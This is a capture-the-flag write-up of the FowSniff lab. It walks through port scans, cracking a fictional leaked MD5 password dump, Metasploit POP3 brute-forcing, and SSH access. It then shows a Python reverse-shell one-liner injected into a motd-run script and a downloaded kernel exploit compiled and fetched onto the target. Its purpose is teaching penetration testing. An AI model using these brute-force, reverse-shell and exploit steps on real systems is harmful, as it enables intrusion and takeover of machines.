# FowSniff WriteUp By Mian Al Ruhanyat

## Links
- **Ip address:10.10.226.177**
- **Website:http://10.10.226.177**
- PasteBin Link : https://pastebin.com/u/berzerk0
- **data leak:** `https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt`
- hashkiller : https://hashkiller.io/listmanager
- Links of Reverse Shell -> https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
## Pointers
- In the frontend we found a msg thats look suspicious 
```sh

	Escape Velocity by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)

```
- `@ajlkn` it could be something valueable
-


## Port Scan

```sh

└─$ sudo nmap -sS -sV -O 10.10.226.177 >> ports.txt


└─$ cat ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 05:48 EDT
Nmap scan report for 10.10.226.177
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/5%OT=22%CT=1%CU=32020%PV=Y%DS=5%DC=I%G=Y%TM=6687C
OS:198%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%TS=8)SEQ(SP
OS:=106%GCD=1%ISR=107%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M
OS:508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68D
OS:F%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%
OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.46 seconds

```
- **For more aggressive scan:**
```sh
└─$ sudo nmap -A -p 22,110,143 10.10.226.177 >> ports.txt 

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING SASL(PLAIN) RESP-CODES TOP USER UIDL AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: post-login ID more listed SASL-IR Pre-login AUTH=PLAINA0001 ENABLE OK LITERAL+ have IDLE LOGIN-REFERRALS capabilities IMAP4rev1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 5.4 (92%), Sony Android TV (Android 5.0) (90%), Linux 3.13 (90%), Linux 3.2 (90%), Linux 3.2 - 3.10 (90%), Linux 3.2 - 3.16 (90%), Linux 3.2 - 3.5 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   44.06 ms  10.17.0.1
2   ... 4
5   167.31 ms 10.10.226.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.06 seconds

```
## Leaked Data
```sh
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------

```
## Hashed Data
```sh
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```

## Process
- I have searched fowsniff corp data leak where I found a pastebin link and into that link there is a .txt file 
- In the leak data we found some hash password
- as we have hashed the leaked password lets create a username file and a password file
- We will bruteForce the name and password in pop3 login uding metasploit framework

## Info For BruteForce
```sh
Usernames:
mauer
mustikka
tegel
baksteen
seina
stone
mursten
parede
sciana

Passwords:
carp4ever
skyler22
apples01
orlando12
mailcall
scoobydoo2
bilbo101
07011972
```
## Metasploit
```sh
msf6 > use auxiliary/scanner/po
use auxiliary/scanner/pop3/pop3_login                          use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/pop3/pop3_version                        use auxiliary/scanner/postgres/postgres_dbname_flag_injection
use auxiliary/scanner/portmap/portmap_amp                      use auxiliary/scanner/postgres/postgres_hashdump
use auxiliary/scanner/portscan/ack                             use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/portscan/ftpbounce                       use auxiliary/scanner/postgres/postgres_schemadump
use auxiliary/scanner/portscan/syn                             use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/portscan/tcp                             
msf6 > use auxiliary/scanner/pop3/pop3_login 
msf6 auxiliary(scanner/pop3/pop3_login) > set rhosts 10.10.226.177
rhosts => 10.10.226.177
msf6 auxiliary(scanner/pop3/pop3_login) > set user_file username.txt
user_file => username.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set pass_file password.txt
pass_file => password.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/pop3/pop3_login) > run

[+] 10.10.226.177:110     - 10.10.226.177:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '


```
- seina:scoobydoo2 its a set of username and password

## Login to PoP3
```sh
└─$ nc 10.10.226.177 110
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list	
+OK 2 messages:
1 1622
2 1280
.

```
- Here is 2 msg . we can retreave them via `retr 1` & `retr 2`
```sh
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.

retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.S1ck3nBluff+secureshell

.


```
- Here we found a `password` that is `S1ck3nBluff+secureshell`
- THe mail is from From: baksteen@fowsniff
- Ao it could be the name for ssh




## Passwords
- seina:scoobydoo2
- ssh - `S1ck3nBluff+secureshell`


## SSH to Baksteen
```sh
└─$ sudo ssh baksteen@10.10.226.177
baksteen@10.10.226.177's password: 
Permission denied, please try again.
baksteen@10.10.226.177's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 


```
- Finding belongings of the users group `find / -group users -type f 2>/dev/null`
- In the Hint of thm we found `cube.sh` so used the previous command
- 	

## Important Keywords for Every CTF
- Finding belongings of the users group `find / -group users -type f 2>/dev/null`

```sh
baksteen@fowsniff:/opt/cube$ cat cube.sh 
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

```
- now we will add python reverse shell one-liner

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- we will add this to our `cube.sh` file

```sh
baksteen@fowsniff:/opt/cube$ cd /etc/update-motd.d/
baksteen@fowsniff:/etc/update-motd.d$ ls
00-header  10-help-text  91-release-upgrade  99-esm
baksteen@fowsniff:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh

```
- As when we login through SSH we get a banner similar to the one that “cube.sh” contains. So we check “/etc/update-motd.d/” directory to look for 
executables that might run this program and find that file “00-header” runs this shell script.
- So now we exit the SSH and set up our listener using netcat, then we again connect through SSH. So that our reverse shell gets executed.
```sh
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.226.177] 48168
/bin/sh: 0: can't access tty; job control turned off
# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
# cd root
# ls
Maildir
flag.txt
# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.



```

## Another way
### Priviledge Escalation
- Search the exploit for your ssh ubuntu server that you gained in the nmap scanning


```sh
└─$ cd /var/www/html/
└─$ sudo wget https://www.exploit-db.com/download/44298
[sudo] password for bc-here: 
--2024-07-05 08:19:43--  https://www.exploit-db.com/download/44298
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6021 (5.9K) [application/txt]
Saving to: ‘44298’

44298                                     100%[=====================================================================================>]   5.88K  --.-KB/s    in 0s      

2024-07-05 08:19:43 (281 MB/s) - ‘44298’ saved [6021/6021]

└─$ sudo mv 44298 44298.c 
└─$ sudo gcc 44298.c -o exploit


```
- Run the python server by `└─$ python3 -m http.server 80`
```sh
baksteen@fowsniff:/tmp$ wget 10.17.88.30/exploit
--2024-07-05 08:33:14--  http://10.17.88.30/exploit
Connecting to 10.17.88.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17216 (17K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                   100%[=====================================================================================>]  16.81K  80.8KB/s    in 0.2s    

2024-07-05 08:33:15 (80.8 KB/s) - ‘exploit’ saved [17216/17216]

baksteen@fowsniff:/tmp$ ls
exploit  systemd-private-6a8146c7132d438e86c53511473ca78a-dovecot.service-ZrWkoZ  systemd-private-6a8146c7132d438e86c53511473ca78a-systemd-timesyncd.service-BQA6ic
baksteen@fowsniff:/tmp$ chmod +x exploit
baksteen@fowsniff:/tmp$ ./exploit
```
